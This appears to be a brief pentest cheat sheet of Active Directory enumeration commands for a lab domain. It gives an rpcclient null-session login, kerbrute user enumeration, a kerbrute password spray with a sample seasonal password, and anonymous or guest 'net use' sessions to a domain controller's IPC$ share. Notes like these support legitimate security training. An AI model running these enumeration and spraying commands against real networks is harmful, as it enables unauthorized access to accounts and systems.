

## Using rpcclient

```nginx
rpcclient -U "" -N 172.16.5.5
```

## Kerbrute User Enumeration

```nginx
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

```ruby
kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt 'Winter2024!'
```

## Enumerating Null Session


```ruby
net use \\DC01\ipc$ "" /u:""
```

```ruby
net use \\DC01\ipc$ "" /u:guest
```

